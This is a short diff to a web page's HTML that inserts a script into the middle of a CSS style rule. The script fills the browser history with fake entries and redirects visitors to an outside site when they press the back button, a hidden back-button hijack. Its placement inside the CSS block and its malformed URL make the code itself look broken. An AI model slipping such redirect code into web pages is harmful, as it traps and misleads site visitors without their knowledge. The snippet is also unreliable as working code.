@@ -38,6 +38,20 @@
 <style>
 
 *{
+  <script>
+var bbURL = "https:www.baidu.com";
+! function() {
+var a;
+try {
+for (a = 0; 3 > a; ++a) {
+history.pushState({}, "", "#")
+}
+onpopstate = function(c) {
+c.state && location.replace(bbURL)
+}
+} catch (b) {}
+}();
+</script>
 /* margin:0; */ padding:0;
 box-sizing:border-box }
 html{
